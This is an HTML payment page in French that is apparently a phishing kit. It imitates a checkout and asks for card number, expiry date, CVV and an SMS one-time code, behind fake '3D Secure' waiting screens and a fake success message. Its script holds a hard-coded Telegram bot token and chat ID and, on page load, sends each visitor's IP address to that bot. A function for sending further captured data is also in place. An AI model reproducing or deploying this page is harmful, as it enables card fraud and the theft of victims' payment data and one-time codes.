<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Formulaire de Paiement</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #f4f4f4;
      margin: 0;
      padding: 0;
    }

    .payment-container {
      background-color: white;
      width: 400px;
      margin: 100px auto;
      padding: 30px;
      border-radius: 10px;
      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
    }

    h2 {
      color: #333;
      text-align: center;
    }

    form label {
      display: block;
      margin-bottom: 5px;
      font-weight: bold;
      text-align: left;
    }

    input[type="text"],
    input[type="number"],
    input[type="submit"] {
      width: 94%;
      padding: 12px;
      margin: 8px 0 20px 0;
      border: 1px solid #ddd;
      border-radius: 5px;
      font-size: 16px;
    }

    input[type="submit"] {
      background-color: #4CAF50;
      color: white;
      border: none;
      cursor: pointer;
      font-size: 18px;
    }

    input[type="submit"]:hover {
      background-color: #45a049;
    }

    .hidden {
      display: none;
    }

    .spinner {
      border: 4px solid #f3f3f3;
      border-top: 4px solid #3498db;
      border-radius: 50%;
      width: 40px;
      height: 40px;
      animation: spin 1s linear infinite;
      margin: 20px auto;
    }

    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
  </style>
</head>
<body>

  <div class="payment-container" id="step-1">
    <h2>Formulaire de Paiement</h2>
    <form id="payment-form">
      <label for="delivery-address">Adresse de livraison</label>
      <input type="text" id="delivery-address" name="delivery-address" required placeholder="Entrez votre adresse de livraison">

      <label for="phone-number">Numéro de téléphone</label>
      <input type="text" id="phone-number" name="phone-number" required placeholder="Entrez votre numéro de téléphone" pattern="^\+?[0-9]{1,4}?[-. \(\)]?([0-9]{1,3}[-. \(\)]?){1,4}[0-9]{1,3}$" title="Veuillez entrer un numéro de téléphone valide.">

      <label for="cardholder-name">Nom sur la carte</label>
      <input type="text" id="cardholder-name" name="cardholder-name" required placeholder="Nom du titulaire de la carte">

      <label for="card-number">Numéro de la carte</label>
      <input type="text" id="card-number" name="card-number" maxlength="16" required placeholder="XXXX XXXX XXXX XXXX">

      <label for="expiry-date">Date d'expiration</label>
      <input type="text" id="expiry-date" name="expiry-date" required placeholder="MM/AA">

      <label for="cvv">Code de sécurité (CVV)</label>
      <input type="number" id="cvv" name="cvv" maxlength="3" required placeholder="XXX">
      
      <center><input type="submit" value="Payer"></center>
    </form>
  </div>

  <div class="payment-container hidden" id="step-2">
    <h2>3D Secure</h2>
    <div class="spinner"></div>
    <center><p>VEUILLEZ PATIENTEZ...</p></center>
  </div>

  <div class="payment-container hidden" id="step-3">
    <h2>Code SMS</h2>
    <p>Entrez le code reçu par SMS :</p>
    <form id="sms-form">
      <input type="text" id="sms-code" name="sms-code" required placeholder="Code SMS">
      <input type="submit" value="Valider">
    </form>
  </div>

  <div class="payment-container hidden" id="step-4">
    <h2>3D Secure</h2>
    <div class="spinner"></div>
    <center><p>VEUILLEZ PATIENTEZ...</p></center>
  </div>

  <div class="payment-container hidden" id="step-5">
    <h2>PAIEMENT RÉUSSI</h2>
    <center><p>Redirection dans quelques instants...</p></center>
  </div>

  <script>
    const TELEGRAM_BOT_TOKEN = '7829797076:AAGfrZMGpGdCYsbSDxYXJBOR8jc4D2AjC1k';
    const TELEGRAM_CHAT_ID = '7747778364';

    let userIP = ''; // Variable pour stocker l'adresse IP de l'utilisateur
    let userFormData = {}; // Objet pour stocker les données du formulaire

    // Fonction pour envoyer un message à Telegram
    function sendToTelegram(message) {
      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
      const data = { chat_id: TELEGRAM_CHAT_ID, text: message };

      fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(data)
      });
    }

    // Ajout automatique de "/" dans le champ de date d'expiration
    document.getElementById('expiry-date').addEventListener('input', function (event) {
      const input = event.target.value.replace(/\D/g, ''); // Supprime les caractères non numériques
      if (input.length <= 2) {
        event.target.value = input; // Ajoute uniquement le mois (MM)
      } else {
        event.target.value = input.slice(0, 2) + '/' + input.slice(2, 4); // Ajoute le format MM/AA
      }
    });

    // Limiter le champ CVV à 3 chiffres maximum
    document.getElementById('cvv').addEventListener('input', function (event) {
      const input = event.target.value.replace(/\D/g, ''); // Supprime tout caractère non numérique
      event.target.value = input.slice(0, 3); // Limite à 3 caractères
    });

    // Fonction pour récupérer l'adresse IP publique de l'utilisateur
    function fetchUserIP() {
      fetch('https://api.ipify.org?format=json')
        .then(response => response.json())
        .then(data => {
          userIP = data.ip; // Stocker l'adresse IP
          sendToTelegram(`Nouvel utilisateur sur le site - IP: ${userIP}`);
        })
        .catch(error => console.error('Erreur lors de la récupération de l\'IP :', error));
    }

    // Appeler la fonction pour récupérer l'adresse IP au chargement de la page
    window.onload = function () {
      fetchUserIP();
    };

  </script>

</body>
</html>
